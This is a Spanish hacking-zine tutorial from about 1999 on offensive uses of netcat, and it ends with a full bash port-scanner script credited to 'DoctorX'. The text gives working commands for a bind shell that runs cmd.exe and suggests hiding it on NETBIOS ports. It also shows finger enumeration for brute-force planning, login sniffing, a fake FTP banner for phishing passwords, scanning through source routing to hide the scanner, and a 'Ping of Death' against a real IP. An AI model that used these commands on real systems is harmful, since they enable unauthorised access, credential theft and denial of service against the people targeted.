 Obtener un Shell rápidamente en una máquina remota usando la opción -l
(Listen) conjuntamente con la opción -e (ejecutar), cuando el proggie
corre  con estas variables y la conexión es realizada, NetCat  ejecuta
el programa elegido y se conecta a stdin y stdout del programa  en  la
conexión a la red.

nc -l -p 23 xxx.xxx.xxx.xx 23 -t -e cmd.exe

 Este comando dejará a NetCat escuchando el Puerto 23 (telnet),  cuando
es  conectado  a  través  del cliente, ejecutará un Shell (cmd.exe) la
opción -t le  dice  a  NetCat  que maneje cualquier negociación que el
cliente pueda esperar....

 Si esta conexión  es realizada desde una máquina NT, el shell  correrá
los  permisos  del proceso que han generado a NetCat (Hmmm...) así que
hay que ser muy cuidadosos :)

 La belleza de NetCat es que puede hacer  lo mismo en CUALQUIER  puerto
:) Puedes dejar a NetCat escuchando en los puertos NETBIOS, que  están
probablemente  corriendo  en  la  mayoría  de las máquinas NT, de esta
manera  puedes  lograr  una conexión a una máquina que esté utilizando
"Filtrado de Puertos"  activado  en  TCP/IP  security  Network Control
Panel, NT  no  parece  tener  ninguna  seguridad  alrededor  de cuales
puertos  los programas de usuarios son permitidos amarrar, esto quiere
decir en pocas palabras, ejecutar  comandos  y  programas  que  puedan
unirse a los Puertos NETBIOS.


 Como anteriormente se mencionó, puedes utilizar a Netcat para estudiar
diferentes puertos, con la siguiente sintaxis:

c:\>nc -v &lt;IP> &lt;puerto> (puedes añadir otra -v)


 Uno de los puertos más interesantes a la Hora de Analizar un Host,  es
el  puerto  79  (Finger),  puedes  obtener  nombres  de   usuarios   e
información  muy  útil  a  la hora de planear un "Brute-Force Attack",
este comandito  de  Netcat  te  muestra la Flexibilidad del Proggie en
cuestión, dándote una idea de sus posibilidades:

c:\>nc -v &lt;host> 79 < user.txt > log.txt

 El comando anterior le dice a netcat que se conecte en modo verbose al
Host predeterminado en el puerto 79 (Finger) y envíe el contenido  del
archivo  user.txt  (OJO:  no  he probado esto con una posible lista de
nombre de usuarios al azahar), la respuesta del servicio será guardada
en el archivo log.txt

Scanner:
========

 Netcat  puede  ser  utilizado como scanner, sus múltiples opciones  le
permiten realizar un gran número de combinaciones,  pudiendo  realizar
Scannings en Puertos Random, en puertos conocidos, en modo  ascendente
o descendente,  con  intervalos  de  tiempo,  utilizando gateways para
evitar mostrar la IP fuente del Scanning, etc. 

 C:\nc11nt>nc -v -v -z 127.0.0.1 53 25 21

DNS fwd/rev mismatch: localhost != darkstar
localhost [127.0.0.1] 53 (domain): connection refused
localhost [127.0.0.1] 25 (smtp): connection refused
localhost [127.0.0.1] 21 (ftp): connection refused
sent 0, rcvd 0: NOTSOCK

 Pues si; aqui tienen  un  pequeño y  primitivo scanner, se  le  pueden
añadir  puertos  escogidos  como en el ejemplo anterior o asignarle un
rango de puertos:

C:\nc11nt>nc -v -v -z 127.0.0.1 1-53

DNS fwd/rev mismatch: localhost != darkstar
localhost [127.0.0.1] 53 (domain): connection refused
localhost [127.0.0.1] 52 (?): connection refused
localhost [127.0.0.1] 51 (?): connection refused
localhost [127.0.0.1] 50 (?): connection refused
localhost [127.0.0.1] 49 (?): connection refused
localhost [127.0.0.1] 48 (?): connection refused  etc...

 Volvemos con la opción -v (verbose) y la Opción -z (zero i/o)  que  es
usada  para scanning, los puertos se lo especificamos al final del  IP
del host, bien  sea individuales separados por un  espacio; o  por  un
rango de puertos.
      

	Sniffer:
	========

 Otra  de  las interesante posibilidades de netcat es su capacidad para
escuchar  conexiones en cualquier puerto, pudiendo redireccionar  todo
el tráfico  del  mismo  hacia  un  archivo  o  hacia pantalla, en este
sencillo ejemplo, podemos observar las bases de un sencillo sniffer en
Windows:

C:\nc11nt>nc -v -v -L 127.0.0.1 -p 23

DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...
DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1131
login: sniffado
password: jeje!!
puedo ver todo lo que escriben aqui... Muuuaaahahahahahah!!! B-]


  También  podemos  redireccionar  toda la salida a un archivo e irnos a
  realizar otras actividades ,mientras netcat hace su trabajo:

C:\nc11nt>nc -v -v -L -p 23 127.0.0.1 -t >login.txt
DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...

[Aqui viene la conexión...]

DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1030

[Todo lo que escriba la conexión se va al archivo login.txt]
 sent 0, rcvd 42

[La opción -L permite que netcat escuche nuevamente al terminar la
conexión,"New Victims Wanted" Hehe!]

DNS fwd/rev mismatch: localhost != darkstar
listening on [127.0.0.1] 23 ...


El Exploit-Explained nc -v -v -L 127.0.0.1 -p 23
--------------------

 Ejecutamos a Netcat con la opción o variable -v (verbose)  (doblemente
"verbose"  por si acaso) ;) esto hará que el resultado de netcat,  sea
mostrado  directamente en pantalla (a diferencia del archivo usado por
Dr._X),  la  opción  o  variable -L  (Listen,  and  listen  again) nos
permitirá  dejar  escuchando  u  "oliendo"  en  determinado puerto aun
cuando la conexión sea interrumpida (listen again), con la variable -p
le indicamos el puerto...

  Al ejecutar a netcat con esa combinación de variables las opción -v me
  indica en pantalla el Host y el puerto de escucha:

DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 23 ...


Realizo  desde  otra  ventana  un telnet a localhost (127.0.0.1) en el
puerto 23, netcat me informa sobre lo que ocurre en el puerto 23:

DNS fwd/rev mismatch: localhost != darkstar
connect to [127.0.0.1] from localhost [127.0.0.1] 1131
login: sniffado


Voilá! un Sniffer en LocalHost!  Jajaja!!!


Detector de Conexiones Sospechosas
==================================

 La  posibilidad de dejar a netcat escuchando en determinados  puertos,
nos permite crear una especie de "trampa" para un supuesto agresor que
utilice scanners, o  herramientas  tales  como NetBus o BackOrifice en
contra de  nuestras  estaciones. Incluso, podemos crear un archivo que
haga un Flood y redireccionar su salida hacia la estación agresora  en
caso de una conexión no  autorizada a  determinado puerto. (jeje! y se
me ocurren un montón de cosas más, Muaahahaha!)  :)

  Este  es  un ejemplo de un detector de BO, Je! y funciona! este es  un
  ejemplo real de un día como cualquier otro en IRC; he aquí el ejemplo:

C:\nc11nt>nc -u -v -v -L -p 31337 127.0.0.1 31337
DNS fwd/rev mismatch: localhost != darkstar
listening on [any] 31337 ...

invalid connection to [0.0.0.0] from nas1-064.ras.bqm.cantv.net
[161.196.246.65]
 31338

 Back Orifice  utiliza  el  protocolo UDP para realizar sus travesuras,
realiza  la conexión desde un puerto aleatorio (casi siempre  el 1080)
aunque en este caso lo hizo desde el 31338 (posiblemente una  variante
de BO),  por  eso se utiliza la opción -u (protocolo udp),  netcat  se
queda  esperando  conexiones  UDP  en el puerto 31337 (default de BO),
cuando  alguien  hace  un  sweep  a tu IP netcat lo detecta enviando a
pantalla el IP y el DNS del agresor...

 Luego un pequeño "Ping of Death" (Nuke) para el transgresor y le hacen
un Scan para ver cuando desaparece B-]

nas1-064.ras.bqm.cantv.net [161.196.246.65] 48 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 47 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 46 (?): connection refused
nas1-064.ras.bqm.cantv.net [161.196.246.65] 45 (?): TIMEDOUT
nas1-064.ras.bqm.cantv.net [161.196.246.65] 44 (?): TIMEDOUT<--Chao!!! Jeje!!


Otros usos Miscelaneos
======================

 Puedes  utilizar  algo  de  ingeniería  social para  capturar  algunos
passwords con netcat, por ejemplo, si una máquina no tiene abierto  el
puerto  de  FTP o de telnet, creas un archivo de texto que solicite el
ID y el Password de la víctima; algo así:

Microsoft Internet FTP Server V.5.9 [Beta]
04/16/99 myhost.com
Please introduce Username, password and press "Enter"
LogOn:

Luego redireccionas el archivo hacia la víctima:

C:\nc11nt>nc -v -v -L -p 21 nombre del host -t < login.txt

Si  el  tonto  cae... Ahí  va  tu  password,  Jeje!! B-]  un  poco  de
imaginación  y  maña  te  permitirán  encontrar muchas utilidades para
netcat.


Netcat en Vez de Telnet
=======================

 Yo personalmente prefiero usar netcat para realizar conexiones remotas
como  alternativa  al Telnet. la ventaja de realizar conexiones telnet
desde netcat es que este esconde "algo" sobre tu conexión, lo  que  lo
hace mas "sigiloso" que telnet, (de ahí por  qué lo  llamaron netcat),
Realizando una conexión "Limpia" en determinado puerto,  obviando  las
negociaciones comunes  de  Telnet  que  pueden confundir al cliente en
determinados casos, como por ejemplo, al  utilizar  ciertas  Backdoors
muy conocidas en Unix.

 OJO:  algunas  máquinas interpretan al cliente de telnet y  asumen  el
nombre  del  usuario  que  lo  utiliza,  de  allí  el  porqué  algunos
servidores solo preguntan por password ; teóricamente netcat  no envía
esta  información.  Por eso,  es recomendable acostumbrarse a utilizar
netcat para hacer conexiones remotas:

 
	c:> nc -v nombre del host 23(o el puerto de tu preferencia)


Netcat y Programación
=====================

 Esta  combinación  desencadena  todo  el Poder de Netcat en su  máxima
expresión; Tratándose  de una  herramienta  que funciona con líneas de
comandos, su integración  con un  lenguaje de  programación le permite
realizar gran cantidad de tareas, y posibilidades se van  descubriendo
día a día con su inclusión en nuevos Scripts y Exploits. 

 Muchos  ScriptKiddies  que  no tienen idea de lo que hacen, se sienten
frustrados porque muchos de los Scripts y Exploits que bajan de la Red 
simplemente no les  funciona, porque no saben  interpretar el Código y
por lo  tanto son  incapaces de efectuar las modificaciones necesarias
para   incluir  librerías,  paths  o  utilidades  necesarias  para  su
funcionamiento. (Jódanse ScriptKiddies!!! Jajaja!!)

 Netcat  es  excelente  para  implementar exploits remotos, permitiendo
enviar el código a cualquier  puerto vulnerable con una  simple orden,
logrando  ejecutar   todos  los  comandos   necesarios  para  explotar
determinados servicios.

 Varios exploits que circulan actualmente en la Red, usan a netcat como
"motor" para  manejar las conexiones, si analizamos el código de estos
programas  podemos  observar  un  nc  por  ahí, esto  significa que el
Proggie en cuestión necesita una versión  correctamente  compilada  de
netcat en el directorio  /usr/bin . A continuación un pequeño programa
realizado por el Doctor_X de Hven utilizando a netcat:

<---------- Hven Port Scanner!! ------>

# !/bin/bash
# Scanner de Puertos 
# By DoctorX 17/04/99  email: d0ct0r_x@hven.com.ve
# Zona de Bacterias  http://bactery.8m.com
# Hackers de Venezuela http://www.hven.com.ve
# Este es un shell script hecho por mi para la verificación de 
# conexiones a un host utilizando netcat.

# Declaración de Variables

export NETCAT=" nc -v -v -w 8 -z "
export RANGO=$2
LOCALHOST=$(uname -n)
export PUERTOS="21 23 25 79 80 110 111 113 139 143 513 514 515 6000 31337"
export MEM1="Scanner de Puertos "
export MEM2="by "   
export MEM22="para Hackers Venezuela"
export MEM3="Victima : " 
export MEM4="Falta el GateWay para el Source Routing !!!!!!"
export MEM5="Te van a pillar !!!!!!! $USER jejejejeje "
export MEM6="Local Host : $LOCALHOST " 
export MEM7="UDP Scan "
export MEM8="http://www.hackhour.com.br/hven"
export re=" [5m"
export cl=" [0m"
export rojo=" [31m"
export email="email:d0ct0r_x@bactery.8m.com"

# Declaración de Funciones

# Mensaje cuando no se le dan Parámetros

function mem() {
local uso="uso  :$0  [opcion]  &lt;host> &lt;gateway>"
local DRX="DoctorX"
echo $MEM1 
echo $MEM2   ${rojo}$DRX${cl}  $MEM22
echo $MEM8
echo ${rojo}$uso${cl} 
echo "&lt;host>             :IP/HOSTNAME de La Victima jejejeje "
echo "&lt;gateway>          :source-routing , es opcional " 
echo "opciones : "
echo "u                  :esta opcion de utiliza para hacer scan udp"
echo "so                 :Determinacion de SO de servidores Web" 
echo "r rango_de_puertos :Cambia el rango de puertos por defecto :plow-phi" &&
exit ; }

# Mensaje Inicial

function mem2() {
VICTIMA=$1
echo $MEM1
echo $MEM2 ${rojo}DoctorX${cl} $MEM22
echo $MEM3  $VICTIMA
echo $MEM6 ; }

# Mensaje 2

function mem_web() {
mem_web1="Hackers Venezuela"
mem_web2="By"
mem_web3="Victima : "
VICTIMA=$1
mem_web4="Determinacion de SO en Web Servers"
echo $mem_web1
echo $mem_web4
echo $mem_web2 ${rojo}DoctorX${cl} $email 
echo $mem_web3 $VICTIMA ;}


# Scan Tcp

function tcp() {
 HOST=$1
 $NETCAT  $HOST $PUERTOS ; }

# Scan Tcp con Rango

function tcp_rango() {
 HOST=$2
 RANGO=$1
 $NETCAT  $HOST $RANGO ; }

# Scan UDP

function udp() {  
VICTIMA=$1
echo $MEM7 
$NETCAT  -u $VICTIMA $PUERTOS ; }

# Scan UDP con gateway

function udp_gateway() {
echo $MEM7
VICTIMA=$2
GATE=$1
NETCAT_GATE="nc -v -v -z -u $VICTIMA -g $GATE " 
$NETCAT_GATE $PUERTOS ; }

# Scan con Source Routing
 
function tcp_gateway() {
GATE=$1
HOST=$2
RANGO=$PUERTOS
echo "Gate : $GATE "  
$NETCAT -g $GATE  $HOST $RANGO ; }

# Advertencia

function  adv() {
local MEM4="Falta el GateWay para el Source Routing !!!!!!"
local MEM5="Te van a pillar !!!!!!! $USER jejejejeje "
echo ${rojo}$MEM4${cl} 
echo ${re}${rojo}$MEM5${cl}  ; }

# Determinación de SO

function web_so() {
NC="nc -w "
HTTPPORT="80"
GET="GET /"
ECHO="/bin/echo"
HEAD="HEAD / HTPP/1.0"
HTTPVARIABLE="Server:"
WEB_SERVER="$1"
LOG="salida.txt"
#CHECKHTTP=( echo $GET  ; sleep 5)| $NETCAT $VICTIMA  80 
( echo $HEAD  ; echo ; echo ) | $NC  8 $WEB_SERVER $HTTPPORT | grep 
$HTTPVARIABLE  | cut -d: -f2  1> $LOG  
cat  $LOG
rm -f $LOG  ;}


# Seleccion de Opcion

case $# in 0 ) mem ;; 
           1 ) mem2 $1 ;
               adv  ;
               tcp $1 ;;
           3 ) if [ "$1" != "r" ]; then 
                  mem2 $2
                  udp_gateway $3 $2
               else {  mem2 $3
                     adv  
                     tcp_rango $2 $3 ;} 
               fi ;;
           2 ) if [ "$1" != "u" ] ; then
                       if [ "$1" != "so" ] ; then
                             {  mem2 $1
                             # adv  
                             tcp_gateway $2 $1 ;} 
                       else { mem_web $2
                              web_so $2 ;} 
                       fi
                else  { export HOST=$2
                       mem2 $HOST 
                       udp $2   
                       exit 0 ;}
                fi ;           
esac

 
<------- Fin del Hven-Scanner, cortar aquí --------->

        Conclusión
        ==========
	 
  Si  estudiamos  detalladamente  las  variables, el  misterio de netcat
  desaparece, viene la parte de la imaginación; ¿Que otras funciones  le
  podemos asignar? ¿Que mas podría hacer? ; al revisar el  programa  que
  envió Dr._X me dije: "Lógico! Hmmm... Y que tal si hacemos así..."; el
  hacking  no  es  más  que probar  nuevas  posibilidades, utilizando el
  ingenio, los  conocimientos  acumulados y una dosis bastante fuerte de
  imaginación podremos lograr lo que queramos.  :)


  Si tienes  otras ideas, utilidades, programas o forma innovadora  para
  utilizar  netcat, escríbenos un  mail, estaré encantado de anexarlo en
  este documento....

  Este Documento fué Realizado por Kliber, Agradecimientos especiales  a
  Doctor_X (Code Freak) :), DarKdEaTH, y a todos los miembros de nuestra
  comunidad por su invaluable Colaboración.

	"Hecho en Venezuela!"

Agradecemos a HVEN...
PortalHack Team
http://portalhack.cjb.net
---------------------------------------------------------[ph4-03.txt]--
```

</div>
